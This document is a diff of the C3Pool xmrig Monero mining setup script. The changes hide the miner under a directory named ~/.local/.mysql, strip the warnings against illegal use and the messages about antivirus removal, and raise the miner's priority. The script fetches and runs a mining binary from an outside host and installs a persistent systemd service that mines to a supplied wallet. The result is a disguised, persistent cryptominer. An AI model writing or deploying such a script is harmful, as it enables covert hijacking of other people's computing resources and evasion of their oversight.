@@ -2,8 +2,6 @@
 
 VERSION=2.11
 
-# printing greetings
-
 echo "C3Pool mining setup script v$VERSION."
 echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
 echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
@@ -15,11 +13,8 @@ if [ "$(id -u)" == "0" ]; then
   echo "警告: 不建议在root用户下使用此脚本"
 fi
 
-# command line arguments
 WALLET=$1
-EMAIL=$2 # this one is optional
-
-# checking prerequisites
+EMAIL=$2
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
@@ -53,15 +48,6 @@ fi
 if ! type lscpu >/dev/null; then
   echo "WARNING: This script requires \"lscpu\" utility to work correctly"
 fi
-
-#if ! sudo -n true 2>/dev/null; then
-#  if ! pidof systemd >/dev/null; then
-#    echo "ERROR: This script requires systemd to work correctly"
-#    exit 1
-#  fi
-#fi
-
-# calculating port
 
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
@@ -108,13 +94,10 @@ fi
 
 echo "Computed port: $PORT"
 
-
-# printing intentions
-
 echo "I will download, setup and run in background Monero CPU miner."
 echo "将进行下载设置,并在后台中运行xmrig矿工."
-echo "If needed, miner in foreground can be started by $HOME/.local/.c3pool/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/.local/.c3pool/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.local/.mysql/miner.sh script."
+echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/.local/.mysql/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
@@ -131,97 +114,76 @@ else
 fi
 
 echo
-echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
+echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
 echo
 
 echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
-echo "等待 15 秒将继续运行安装 (按 Ctrl+C 取消)"
 sleep 15
 echo
-echo
-
-# start doing stuff: preparing miner
 
 echo "[*] Removing previous c3pool miner (if any)"
-echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop c3pool_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/.local/.c3pool directory"
-rm -rf $HOME/.local/.c3pool
+echo "[*] Removing $HOME/.local/.mysql directory"
+rm -rf $HOME/.local/.mysql
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
-echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
 if ! curl -L --progress-bar "https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.c3pool"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/.local/.c3pool"
-[ -d $HOME/.local/.c3pool ] || mkdir $HOME/.local/.c3pool
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.c3pool; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.c3pool directory"
-  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/.local/.c3pool 目录"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.mysql"
+[ -d $HOME/.local/.mysql ] || mkdir -p $HOME/.local/.mysql
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.mysql; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.mysql directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/.local/.c3pool/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/.local/.c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.local/.c3pool/config.json
-$HOME/.local/.c3pool/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/.local/.mysql/xmrig works fine"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.local/.mysql/config.json
+$HOME/.local/.mysql/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.local/.c3pool/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.local/.c3pool/xmrig is not functional"
-	echo "警告: 版本 $HOME/.local/.c3pool/xmrig 无法正常工作"
-  else 
-    echo "WARNING: Advanced version of $HOME/.local/.c3pool/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/.local/.c3pool/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
+  if [ -f $HOME/.local/.mysql/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/.local/.mysql/xmrig is not functional"
+  else
+    echo "WARNING: Advanced version of $HOME/.local/.mysql/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  echo "[*] 查看最新版本的 xmrig 挖矿工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.c3pool"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/.local/.c3pool"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.c3pool --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.c3pool directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/.local/.c3pool 目录下"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.local/.mysql"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/.local/.mysql --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.local/.mysql directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.local/.c3pool/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/.local/.c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.local/.c3pool/config.json
-  $HOME/.local/.c3pool/xmrig --help >/dev/null
-  if (test $? -ne 0); then 
-    if [ -f $HOME/.local/.c3pool/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.local/.c3pool/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/.local/.c3pool/xmrig 也无法使用"
-    else 
-      echo "ERROR: Stock version of $HOME/.local/.c3pool/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/.local/.c3pool/xmrig 已被杀毒软件删除"
+  echo "[*] Checking if stock version of $HOME/.local/.mysql/xmrig works fine"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.local/.mysql/config.json
+  $HOME/.local/.mysql/xmrig --help >/dev/null
+  if (test $? -ne 0); then
+    if [ -f $HOME/.local/.mysql/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/.local/.mysql/xmrig is not functional too"
+    else
+      echo "ERROR: Stock version of $HOME/.local/.mysql/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.local/.c3pool/xmrig is OK"
-echo "[*] 矿工 $HOME/.local/.c3pool/xmrig 运行正常"
+echo "[*] Miner $HOME/.local/.mysql/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -234,113 +196,69 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/.local/.c3pool/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.local/.c3pool/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.local/.c3pool/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.local/.c3pool/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.local/.c3pool/xmrig.log'",#' $HOME/.local/.c3pool/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.local/.c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/.local/.mysql/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.local/.mysql/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.local/.mysql/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.local/.mysql/config.json
 
-cp $HOME/.local/.c3pool/config.json $HOME/.local/.c3pool/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.local/.c3pool/config_background.json
-
-# preparing script
-
-echo "[*] Creating $HOME/.local/.c3pool/miner.sh script"
-echo "[*] 在该目录下创建 $HOME/.local/.c3pool/miner.sh 脚本"
-cat >$HOME/.local/.c3pool/miner.sh <<EOL
+echo "[*] Writing $HOME/.local/.mysql/miner.sh"
+cat >$HOME/.local/.mysql/miner.sh <<EOF
 #!/bin/bash
-if ! pidof xmrig >/dev/null; then
-  nice $HOME/.local/.c3pool/xmrig \$*
+exec $HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --no-color --print-time=60 --donate-level=1
+EOF
+chmod +x $HOME/.local/.mysql/miner.sh
+
+echo "[*] Writing $HOME/.local/.mysql/run.sh"
+cat >$HOME/.local/.mysql/run.sh <<EOF
+#!/bin/bash
+if sudo -n true 2>/dev/null; then
+  sudo systemctl start c3pool_miner.service
 else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
-  echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
+  echo "No passwordless sudo, running miner in background from .profile"
+  nohup $HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60 >$HOME/.local/.mysql/miner.log 2>&1 &
 fi
-EOL
+EOF
+chmod +x $HOME/.local/.mysql/run.sh
 
-chmod +x $HOME/.local/.c3pool/miner.sh
-
-# preparing script background work and work under reboot
-
-if ! sudo -n true 2>/dev/null; then
-  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.local/.c3pool/miner.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/.local/.c3pool/miner.sh 到 $HOME/.profile"
-    echo "$HOME/.local/.c3pool/miner.sh --config=$HOME/.local/.c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
-  else 
-    echo "Looks like $HOME/.local/.c3pool/miner.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/.local/.c3pool/miner.sh 已存在于 $HOME/.profile 中."
-  fi
-  echo "[*] Running miner in the background (see logs in $HOME/.local/.c3pool/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/.local/.c3pool/xmrig.log 日志文件)"
-  /bin/bash $HOME/.local/.c3pool/miner.sh --config=$HOME/.local/.c3pool/config_background.json >/dev/null 2>&1
+echo "[*] Writing $HOME/.local/.mysql/stop.sh"
+cat >$HOME/.local/.mysql/stop.sh <<EOF
+#!/bin/bash
+if sudo -n true 2>/dev/null; then
+  sudo systemctl stop c3pool_miner.service
 else
+  pkill -9 xmrig
+fi
+EOF
+chmod +x $HOME/.local/.mysql/stop.sh
 
-  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
-    echo "[*] Enabling huge pages"
-	echo "[*] 启用 huge pages"
-    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
-    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
-  fi
-
-  if ! type systemctl >/dev/null; then
-
-    echo "[*] Running miner in the background (see logs in $HOME/.local/.c3pool/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/.local/.c3pool/xmrig.log 日志文件)"
-    /bin/bash $HOME/.local/.c3pool/miner.sh --config=$HOME/.local/.c3pool/config_background.json >/dev/null 2>&1
-    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
-    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
-
-  else
-
-    echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/c3pool_miner.service <<EOL
+if sudo -n true 2>/dev/null; then
+  echo "[*] Writing systemd service file /etc/systemd/system/c3pool_miner.service"
+  sudo bash -c "cat >/etc/systemd/system/c3pool_miner.service" <<EOF
 [Unit]
-Description=Monero miner service
+Description=C3Pool miner service
+After=network.target
 
 [Service]
-ExecStart=$HOME/.local/.c3pool/xmrig --config=$HOME/.local/.c3pool/config.json
+Type=simple
+ExecStart=$HOME/.local/.mysql/xmrig --config=$HOME/.local/.mysql/config.json --donate-level=1 --print-time=60
 Restart=always
-Nice=10
-CPUWeight=1
+RestartSec=10
+Nice=-10
+CPUWeight=80
 
 [Install]
 WantedBy=multi-user.target
-EOL
-    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
-    echo "[*] Starting c3pool_miner systemd service"
-	echo "[*] 启动c3pool_miner systemd服务"
-    sudo killall xmrig 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u c3pool_miner -f\" 命令"
-  fi
-fi
+EOF
 
-echo ""
-echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
-if [ "$CPU_THREADS" -lt "4" ]; then
-  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
-  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
-  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  else
-    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
-  fi
+  echo "[*] Enabling systemd service"
+  sudo systemctl daemon-reload
+  sudo systemctl enable c3pool_miner.service
+  sudo systemctl start c3pool_miner.service
 else
-  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.local/.c3pool/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.local/.c3pool/config_background.json"
+  echo "[*] You don't have passwordless sudo, you need to run miner manually or add it to your $HOME/.profile"
 fi
-echo ""
 
-echo "[*] Setup complete"
-echo "[*] 安装完成"
-echo "警告: 请勿将此脚本使用在非法用途,如有发现在非自己所有权的服务器内使用该脚本"
-echo "我们将在接到举报后,封禁违法的钱包地址,并将有关信息收集并提交给警方"
+echo
+echo "Setup complete."
+echo "Use $HOME/.local/.mysql/run.sh to start miner, and $HOME/.local/.mysql/stop.sh to stop it."
+echo
